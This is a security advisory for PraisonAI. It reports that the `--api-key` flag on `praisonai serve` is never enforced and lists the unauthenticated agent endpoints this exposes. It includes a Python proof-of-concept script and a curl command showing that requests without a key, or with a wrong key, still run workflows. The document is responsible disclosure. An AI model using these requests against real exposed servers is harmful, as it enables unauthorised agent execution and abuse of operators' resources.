# [H] PraisonAI: `--api-key` flag on `praisonai serve` is not properly enforced

## Summary
Severity: High
Advisory: GHSA-pvxx-r596-f5qj
CVE: CVE-2026-55541
CWE: CWE-862
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:H/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-08-25
Source: https://github.com/advisories/GHSA-pvxx-r596-f5qj
Type: github-advisory

## Affected
- PyPI: `PraisonAI` — affected >=0 <4.6.58

## Details
## Summary

`praisonai serve agents` and `praisonai serve unified` both accept `--api-key` for authentication. The flag is parsed but never wired into the FastAPI app — no middleware, no header check, nothing. The server runs wide open regardless of what key you set. Tested on 4.6.50 from PyPI.

## Affected versions

- Confirmed on **4.6.50** (current PyPI, 2026-06-02)
- Likely since **4.6.34** when the serve subsystem shipped
- File: `src/praisonai/praisonai/cli/features/serve.py`

## What happens

The CLI defines `--api-key` in the arg spec (`serve.py:199`) and passes the parsed value into `_create_agents_app(config)`. But that function never reads `config["api_key"]`. The FastAPI app gets created with no auth at all. Same thing in `_create_unified_app`.

The help text says `--api-key <key>   API key for authentication`, so this isn't ambiguous — it's supposed to protect the server. It just doesn't.
```
$ grep -n "api_key" src/praisonai/praisonai/cli/features/serve.py
107:  --api-key <key>   API key for authentication
199:            "api_key": {"default": None},
847:            "api_key": {"default": None},
```

## Endpoints exposed without auth

- `POST /agents` — runs the full agent workflow
- `POST /agents/{name}` — invokes a specific agent
- `POST /api/v1/agents/{id}/invoke` — n8n integration endpoint
- `GET /` — lists all endpoints
- `GET /__praisonai__/discovery` — service discovery

## Not the same as CVE-2026-44338

CVE-2026-44338 was about the legacy `deploy/api.py` hardcoding `AUTH_ENABLED = False`. That was fixed in 4.6.34. This bug is in the newer `serve` subsystem that shipped in the same release — the `--api-key` flag exists but was never connected to anything.

## PoC

### Setup

```bash
python3 -m venv /tmp/poc-venv
/tmp/poc-venv/bin/pip install praisonai==4.6.50 fastapi starlette httpx pyyaml
```

### Script

```python
import sys, types, tempfile, os

# Stub heavy deps so we only test the serve auth logic
for m in ["praisonai.endpoints.discovery", "praisonai.endpoints.server",
          "praisonai.api", "praisonai.api.agent_invoke",
          "praisonai.agents_generator", "praisonai.inc"]:
    sys.modules[m] = types.ModuleType(m)

disc = sys.modules["praisonai.endpoints.discovery"]
class Fake:
    def __init__(self, **k): pass
    def add_provider(self, *a, **k): pass
    def add_endpoint(self, *a, **k): pass
    def to_dict(self): return {}
disc.create_discovery_document = lambda **k: Fake()
disc.EndpointInfo = Fake
disc.ProviderInfo = Fake
sys.modules["praisonai.endpoints.server"].add_discovery_routes = lambda a,b: None
sys.modules["praisonai.api.agent_invoke"].FASTAPI_AVAILABLE = False

class FakeGen:
    def __init__(self, **k): pass
    def generate_crew_and_kickoff(self):
        return {"executed": True, "result": "workflow ran"}
sys.modules["praisonai.agents_generator"].AgentsGenerator = FakeGen

class FakeLLM:
    def to_dict(self): return {}
sys.modules["praisonai.inc"].LLMConfig = FakeLLM

f = tempfile.NamedTemporaryFile(mode="w", suffix=".yaml", delete=False)
f.write("name: T\nagents:\n  a:\n    name: A\n    role: R\n    goal: G\n    backstory: B\n")
f.flush()

from praisonai.cli.features.serve import ServeHandler
app = ServeHandler()._create_agents_app({
    "file": f.name, "host": "0.0.0.0", "port": 8000,
    "path": "/agents", "reload": False,
    "api_key": "supersecret",   # <-- should protect the server
})

from starlette.testclient import TestClient
c = TestClient(app)

r1 = c.post("/agents", json={"query": "run"})
r2 = c.post("/agents", json={"query": "run"},
            headers={"Authorization": "Bearer TOTALLY_WRONG"})

print(f"No auth header → {r1.status_code}")   # 200
print(f"Wrong key      → {r2.status_code}")   # 200

os.unlink(f.name)
```

### Output

```
No auth header → 200
Wrong key      → 200
```

Both succeed. The key is ignored.

### Live server test

```bash
# start server with --api-key
praisonai serve agents --api-key supersecret --host 0.0.0.0 --port 9999

# hit it without any auth
curl -s -X POST http://localhost:9999/agents \
  -H "Content-Type: application/json" \
  -d '{"query":"run all agents"}'
# → 200, workflow executes
```

## Impact

Anyone who can reach the server can trigger agent workflows without credentials. The operator set `--api-key` and got no error, so they think it's protected.

What an attacker gets depends on what the agents.yaml workflow can do — LLM calls, tool use, file access, code execution, web requests. At minimum it's unauthenticated API quota burn.

## Fix

`_create_agents_app()` and `_create_unified_app()` need to actually read `config["api_key"]` and add a FastAPI dependency that checks the `Authorization: Bearer` header. When binding to a non-loopback address without `--api-key`, the server should warn or refuse to start.

## References

- CVE-2026-44338 / GHSA-6rmh-7xcm-cpxj (prior auth bypass, different component)

## References
- https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-pvxx-r596-f5qj
- https://github.com/MervinPraison/PraisonAI/commit/2f9677abb2ea68eab864ee8b6a828fd0141612e1
- https://github.com/MervinPraison/PraisonAI
- https://github.com/MervinPraison/PraisonAI/releases/tag/v4.6.58
